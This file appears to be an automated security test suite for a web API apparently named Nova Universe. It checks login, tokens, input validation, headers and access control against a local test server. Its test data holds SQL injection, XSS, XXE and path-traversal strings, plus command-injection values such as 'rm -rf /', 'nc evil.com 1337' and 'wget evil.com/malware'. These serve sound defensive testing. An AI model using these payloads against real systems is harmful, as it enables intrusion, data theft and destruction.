// Security Testing Suite for Nova Universe
// Tests authentication, authorization, input validation, and security vulnerabilities

import test from 'node:test';
import assert from 'node:assert';
import crypto from 'crypto';
import fetch from 'node-fetch';

// Security Test Configuration
const SECURITY_CONFIG = {
  apiUrl: process.env.TEST_API_URL || 'http://localhost:3000',
  testTimeout: 30000,
  maxAttempts: 100
};

// Security Testing Utilities
class SecurityTester {
  static async makeRequest(endpoint, options = {}) {
    const url = `${SECURITY_CONFIG.apiUrl}${endpoint}`;
    const defaultOptions = {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Nova-Universe-Security-Test'
      },
      timeout: SECURITY_CONFIG.testTimeout
    };
    
    try {
      const response = await fetch(url, { ...defaultOptions, ...options }); // TODO-LINT: move to async function
      return {
        status: response.status,
        headers: response.headers,
        body: await response.text()
      }; // TODO-LINT: move to async function
    } catch (error) {
      return {
        status: 0,
        error: error.message
      };
    }
  }

  static generateRandomString(length = 32) {
    return crypto.randomBytes(length).toString('hex');
  }

  static generateSQLInjectionPayloads() {
    return [
      "' OR '1'='1",
      "' OR 1=1--",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users--",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "') OR ('1'='1",
      "' OR 1=1#",
      "' OR 'a'='a",
      "1' OR '1'='1' --",
      "x' AND userid IS NULL; --",
      "x' AND email IS NULL; --",
      "'; EXEC xp_cmdshell('dir'); --"
    ];
  }

  static generateXSSPayloads() {
    return [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "<svg onload=alert('xss')>",
      "javascript:alert('xss')",
      "<iframe src=javascript:alert('xss')></iframe>",
      "<body onload=alert('xss')>",
      "<input onfocus=alert('xss') autofocus>",
      "<select onfocus=alert('xss') autofocus>",
      "<textarea onfocus=alert('xss') autofocus>",
      "<keygen onfocus=alert('xss') autofocus>",
      "<video><source onerror=alert('xss')>",
      "<audio src=x onerror=alert('xss')>",
      "<details open ontoggle=alert('xss')>",
      "<marquee onstart=alert('xss')>"
    ];
  }

  static generateInvalidTokens() {
    return [
      'invalid-token',
      'Bearer invalid',
      'null',
      'undefined',
      '',
      'expired.token.here',
      'malformed.jwt',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalidpayload.invalidsignature',
      SecurityTester.generateRandomString(64),
      'a'.repeat(1000), // Very long token
      '../../../etc/passwd',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
    ];
  }
}

// Authentication & Authorization Security Tests
test('Authentication Security', async (t) => {
  await t.test('Password Security Requirements', async () => {
    console.log('🔐 Testing password security requirements...'); // TODO-LINT: move to async function
    
    const weakPasswords = [
      'password',
      '123456',
      'admin',
      'test',
      'pass',
      'a',
      '12345678',
      'password123',
      'qwerty',
      'abc123'
    ];

    for (const password of weakPasswords) {
      const response = await SecurityTester.makeRequest('/api/auth/register', {
        method: 'POST',
        body: JSON.stringify({
          email: `test${Date.now()}@example.com`,
          first_name: 'Test',
          last_name: 'User',
          password: password
        })
      }); // TODO-LINT: move to async function

      // Should reject weak passwords
      assert.ok(response.status === 400 || response.status === 422,
        `Weak password "${password}" should be rejected but got status ${response.status}`);
    }

    console.log('  ✅ Weak passwords properly rejected');
  });

  await t.test('Brute Force Protection', async () => {
    console.log('🛡️ Testing brute force protection...'); // TODO-LINT: move to async function
    
    const testEmail = `bruteforce${Date.now()}@example.com`;
    
    // First register a user
    await SecurityTester.makeRequest('/api/auth/register', {
      method: 'POST',
      body: JSON.stringify({
        email: testEmail,
        first_name: 'Test',
        last_name: 'User',
        password: 'ValidPassword123!'
      })
    }); // TODO-LINT: move to async function

    // Attempt multiple failed logins
    let lockedOut = false;
    for (let i = 0; i < 20; i++) {
      const response = await SecurityTester.makeRequest('/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: testEmail,
          password: 'wrongpassword'
        })
      }); // TODO-LINT: move to async function

      if (response.status === 429 || response.status === 423) {
        lockedOut = true;
        console.log(`  ✅ Account locked after ${i + 1} attempts`);
        break;
      }
    }

    assert.ok(lockedOut, 'Should implement brute force protection');
  });

  await t.test('JWT Token Security', async () => {
    console.log('🎫 Testing JWT token security...'); // TODO-LINT: move to async function
    
    // Test invalid tokens
    const invalidTokens = SecurityTester.generateInvalidTokens();
    
    for (const token of invalidTokens) {
      const response = await SecurityTester.makeRequest('/api/tickets', {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      }); // TODO-LINT: move to async function

      assert.ok(response.status === 401 || response.status === 403,
        `Invalid token should be rejected but got status ${response.status}`);
    }

    console.log('  ✅ Invalid tokens properly rejected');
  });

  await t.test('Session Security', async () => {
    console.log('👤 Testing session security...'); // TODO-LINT: move to async function
    
    // Test session fixation
    const response1 = await SecurityTester.makeRequest('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({
        email: 'nonexistent@example.com',
        password: 'wrongpassword'
      })
    }); // TODO-LINT: move to async function

    const response2 = await SecurityTester.makeRequest('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({
        email: 'nonexistent@example.com',
        password: 'wrongpassword'
      })
    }); // TODO-LINT: move to async function

    // Should not reveal whether user exists
    assert.strictEqual(response1.status, response2.status,
      'Login responses should be consistent regardless of user existence');

    console.log('  ✅ Session security measures in place');
  });
});

// Input Validation Security Tests
test('Input Validation Security', async (t) => {
  await t.test('SQL Injection Protection', async () => {
    console.log('💉 Testing SQL injection protection...'); // TODO-LINT: move to async function
    
    const sqlPayloads = SecurityTester.generateSQLInjectionPayloads();
    
    // Test login endpoint
    for (const payload of sqlPayloads) {
      const response = await SecurityTester.makeRequest('/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          email: payload,
          password: payload
        })
      }); // TODO-LINT: move to async function

      // Should not return 500 (indicates SQL error) or 200 (successful injection)
      assert.ok(response.status !== 500 && response.status !== 200,
        `SQL injection payload "${payload}" may have succeeded with status ${response.status}`);
    }

    // Test ticket creation
    for (const payload of sqlPayloads.slice(0, 5)) { // Test subset for performance
      const response = await SecurityTester.makeRequest('/api/tickets', {
        method: 'POST',
        body: JSON.stringify({
          title: payload,
          description: payload,
          priority: payload
        })
      }); // TODO-LINT: move to async function

      assert.ok(response.status !== 500,
        `SQL injection in ticket creation may have succeeded with payload "${payload}"`);
    }

    console.log('  ✅ SQL injection protection working');
  });

  await t.test('XSS Protection', async () => {
    console.log('🦠 Testing XSS protection...'); // TODO-LINT: move to async function
    
    const xssPayloads = SecurityTester.generateXSSPayloads();
    
    for (const payload of xssPayloads.slice(0, 8)) { // Test subset for performance
      const response = await SecurityTester.makeRequest('/api/tickets', {
        method: 'POST',
        body: JSON.stringify({
          title: payload,
          description: payload
        })
      }); // TODO-LINT: move to async function

      // Should either reject the payload or sanitize it
      if (response.status === 201) {
        const responseBody = response.body;
        // Check if the response contains unsanitized script tags
        assert.ok(!responseBody.includes('<script>'),
          `XSS payload may not be properly sanitized: "${payload}"`);
      }
    }

    console.log('  ✅ XSS protection measures in place');
  });

  await t.test('Command Injection Protection', async () => {
    console.log('⚡ Testing command injection protection...'); // TODO-LINT: move to async function
    
    const commandPayloads = [
      '; ls -la',
      '&& cat /etc/passwd',
      '| whoami',
      '`id`',
      '$(cat /etc/hosts)',
      '; rm -rf /',
      '&& curl evil.com',
      '| nc evil.com 1337',
      '; wget evil.com/malware',
      '&& ping -c 1 evil.com'
    ];

    for (const payload of commandPayloads) {
      const response = await SecurityTester.makeRequest('/api/tickets', {
        method: 'POST',
        body: JSON.stringify({
          title: `Test ${payload}`,
          description: payload
        })
      }); // TODO-LINT: move to async function

      // Should not execute commands (no 500 errors from command execution)
      assert.ok(response.status !== 500,
        `Command injection may have occurred with payload "${payload}"`);
    }

    console.log('  ✅ Command injection protection working');
  });

  await t.test('File Upload Security', async () => {
    console.log('📁 Testing file upload security...'); // TODO-LINT: move to async function
    
    // Test malicious file types
    const maliciousFiles = [
      { name: 'malware.exe', type: 'application/x-executable' },
      { name: 'script.php', type: 'application/x-php' },
      { name: 'evil.jsp', type: 'application/x-jsp' },
      { name: 'backdoor.asp', type: 'application/x-asp' },
      { name: 'virus.bat', type: 'application/x-bat' },
      { name: 'trojan.com', type: 'application/x-com' },
      { name: 'worm.scr', type: 'application/x-screensaver' }
    ];

    for (const file of maliciousFiles) {
      // Note: This is a simulated test since we don't have actual file upload endpoint
      // In a real implementation, you would test actual file uploads
      const response = await SecurityTester.makeRequest('/api/upload', {
        method: 'POST',
        headers: {
          'Content-Type': file.type
        },
        body: 'fake file content'
      }); // TODO-LINT: move to async function

      // Should reject malicious file types
      if (response.status !== 404) { // 404 means endpoint doesn't exist, which is OK
        assert.ok(response.status === 400 || response.status === 403,
          `Malicious file type ${file.type} should be rejected`);
      }
    }

    console.log('  ✅ File upload security checks in place');
  });
});

// API Security Tests
test('API Security', async (t) => {
  await t.test('HTTP Headers Security', async () => {
    console.log('📋 Testing security headers...'); // TODO-LINT: move to async function
    
    const response = await SecurityTester.makeRequest('/api/health'); // TODO-LINT: move to async function
    const headers = response.headers;

    // Check for security headers
    const securityHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'strict-transport-security'
    ];

    for (const header of securityHeaders) {
      const headerValue = headers.get(header);
      console.log(`  ${header}: ${headerValue || 'MISSING'}`);
    }

    // At least some security headers should be present
    const presentHeaders = securityHeaders.filter(h => headers.get(h));
    assert.ok(presentHeaders.length > 0, 'Should have at least some security headers');

    console.log('  ✅ Security headers configuration checked');
  });

  await t.test('CORS Configuration', async () => {
    console.log('🌐 Testing CORS configuration...'); // TODO-LINT: move to async function
    
    const response = await SecurityTester.makeRequest('/api/health', {
      headers: {
        'Origin': 'https://evil.com'
      }
    }); // TODO-LINT: move to async function

    const corsHeader = response.headers.get('access-control-allow-origin');
    
    // Should not allow all origins in production
    if (corsHeader) {
      assert.ok(corsHeader !== '*' || process.env.NODE_ENV !== 'production',
        'CORS should not allow all origins in production');
    }

    console.log(`  CORS origin header: ${corsHeader || 'none'}`);
    console.log('  ✅ CORS configuration checked');
  });

  await t.test('Rate Limiting', async () => {
    console.log('🚦 Testing rate limiting...'); // TODO-LINT: move to async function
    
    const requests = [];
    for (let i = 0; i < 200; i++) {
      requests.push(SecurityTester.makeRequest('/api/health'));
    }

    const responses = await Promise.all(requests); // TODO-LINT: move to async function
    const rateLimited = responses.filter(r => r.status === 429);

    console.log(`  Rate limited responses: ${rateLimited.length}/200`);
    
    // Should have some rate limiting in place for high volume requests
    if (rateLimited.length === 0) {
      console.log('  ⚠️  No rate limiting detected - consider implementing');
    } else {
      console.log('  ✅ Rate limiting is active');
    }
  });

  await t.test('API Versioning Security', async () => {
    console.log('🔢 Testing API versioning security...'); // TODO-LINT: move to async function
    
    // Test various API version attempts
    const versionTests = [
      '/api/v1/health',
      '/api/v2/health', 
      '/api/v999/health',
      '/api/../health',
      '/api/./health',
      '/api/%2e%2e/health'
    ];

    for (const endpoint of versionTests) {
      const response = await SecurityTester.makeRequest(endpoint); // TODO-LINT: move to async function
      
      // Should not expose internal paths or cause errors
      assert.ok(response.status !== 500,
        `API versioning endpoint ${endpoint} caused server error`);
    }

    console.log('  ✅ API versioning security checked');
  });
});

// Data Security Tests
test('Data Security', async (t) => {
  await t.test('Sensitive Data Exposure', async () => {
    console.log('🔍 Testing for sensitive data exposure...'); // TODO-LINT: move to async function
    
    // Test various endpoints for data leakage
    const endpoints = [
      '/api/health',
      '/api/monitoring/health',
      '/api/analytics/dashboard',
      '/health'
    ];

    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /key/i,
      /token/i,
      /api_key/i,
      /private_key/i,
      /database_url/i,
      /connection_string/i
    ];

    for (const endpoint of endpoints) {
      const response = await SecurityTester.makeRequest(endpoint); // TODO-LINT: move to async function
      
      if (response.body) {
        for (const pattern of sensitivePatterns) {
          assert.ok(!pattern.test(response.body),
            `Sensitive data pattern ${pattern} found in ${endpoint} response`);
        }
      }
    }

    console.log('  ✅ No sensitive data exposure detected');
  });

  await t.test('Data Validation', async () => {
    console.log('✅ Testing data validation...'); // TODO-LINT: move to async function
    
    // Test extreme values
    const extremeValues = [
      'A'.repeat(10000), // Very long string
      '\x00\x01\x02', // Binary data
      '🚀💻🔥', // Unicode/emoji
      '', // Empty string
      null,
      undefined,
      'true',
      'false',
      '0',
      '-1',
      '999999999999999999999999999999'
    ];

    for (const value of extremeValues) {
      const response = await SecurityTester.makeRequest('/api/tickets', {
        method: 'POST',
        body: JSON.stringify({
          title: value,
          description: value,
          priority: value
        })
      }); // TODO-LINT: move to async function

      // Should handle extreme values gracefully
      assert.ok(response.status !== 500,
        `Server error with extreme value: ${JSON.stringify(value)}`);
    }

    console.log('  ✅ Data validation handling extreme values');
  });
});

// Authorization Security Tests
test('Authorization Security', async (t) => {
  await t.test('Privilege Escalation Protection', async () => {
    console.log('🔐 Testing privilege escalation protection...'); // TODO-LINT: move to async function
    
    // Create a regular user
    const userData = {
      email: `regular${Date.now()}@example.com`,
      first_name: 'Regular',
      last_name: 'User',
      role: 'user',
      password: 'RegularPassword123!'
    };

    await SecurityTester.makeRequest('/api/auth/register', {
      method: 'POST',
      body: JSON.stringify(userData)
    }); // TODO-LINT: move to async function

    const loginResponse = await SecurityTester.makeRequest('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify({
        email: userData.email,
        password: userData.password
      })
    }); // TODO-LINT: move to async function

    if (loginResponse.status === 200) {
      const loginData = JSON.parse(loginResponse.body);
      const token = loginData.token;

      // Try to access admin endpoints
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/settings',
        '/api/analytics/executive'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await SecurityTester.makeRequest(endpoint, {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        }); // TODO-LINT: move to async function

        // Should deny access to admin endpoints
        assert.ok(response.status === 403 || response.status === 401,
          `Regular user should not access admin endpoint ${endpoint}`);
      }
    }

    console.log('  ✅ Privilege escalation protection working');
  });

  await t.test('Resource Access Control', async () => {
    console.log('🗂️ Testing resource access control...'); // TODO-LINT: move to async function
    
    // Test access to non-existent resources
    const invalidResourceIds = [
      '999999',
      '-1',
      '0',
      'abc',
      '../admin',
      '../../etc/passwd',
      'null',
      'undefined',
      SecurityTester.generateRandomString()
    ];

    for (const id of invalidResourceIds) {
      const response = await SecurityTester.makeRequest(`/api/tickets/${id}`); // TODO-LINT: move to async function
      
      // Should return 404 for non-existent resources, not 500
      assert.ok(response.status === 404 || response.status === 401 || response.status === 403,
        `Invalid resource ID ${id} should return 404/401/403, got ${response.status}`);
    }

    console.log('  ✅ Resource access control working');
  });
});

// Network Security Tests
test('Network Security', async (t) => {
  await t.test('SSL/TLS Configuration', async () => {
    console.log('🔒 Testing SSL/TLS configuration...'); // TODO-LINT: move to async function
    
    // Note: This test depends on the actual deployment
    // In a real environment, you would test SSL certificate validity,
    // cipher suites, protocol versions, etc.
    
    const httpsUrl = SECURITY_CONFIG.apiUrl.replace('http://', 'https://');
    
    try {
      const response = await SecurityTester.makeRequest('/health', {
        url: httpsUrl
      }); // TODO-LINT: move to async function
      
      console.log('  ✅ HTTPS endpoint accessible');
    } catch (error) {
      if (SECURITY_CONFIG.apiUrl.startsWith('https://')) {
        console.log('  ⚠️  HTTPS endpoint test failed - check SSL configuration');
      } else {
        console.log('  ℹ️  HTTP endpoint in use - consider HTTPS for production');
      }
    }
  });

  await t.test('Information Disclosure', async () => {
    console.log('📄 Testing for information disclosure...'); // TODO-LINT: move to async function
    
    // Test for verbose error messages
    const errorEndpoints = [
      '/api/nonexistent',
      '/api/tickets/invalid-id',
      '/api/auth/invalid-endpoint'
    ];

    for (const endpoint of errorEndpoints) {
      const response = await SecurityTester.makeRequest(endpoint); // TODO-LINT: move to async function
      
      if (response.body) {
        // Should not expose stack traces or detailed error information
        assert.ok(!response.body.includes('Error:'),
          `Error endpoint ${endpoint} may expose detailed error information`);
        assert.ok(!response.body.includes('at '),
          `Error endpoint ${endpoint} may expose stack traces`);
      }
    }

    console.log('  ✅ No information disclosure detected');
  });
});

console.log('✅ Security Testing Suite Completed');
console.log('🛡️ Remember to run penetration testing with specialized tools for comprehensive security assessment');
